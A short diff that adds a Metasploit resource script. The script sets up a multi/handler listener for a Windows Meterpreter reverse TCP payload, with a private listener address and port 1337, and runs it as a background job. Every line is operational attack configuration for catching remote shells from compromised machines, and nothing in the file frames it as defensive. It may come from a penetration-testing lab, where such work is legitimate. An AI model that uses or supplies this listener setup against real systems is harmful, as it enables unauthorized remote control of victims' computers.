@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 1337
+set LHOST 192.168.28.174
+exploit -j -z
+setg DisablePayloadHandler l
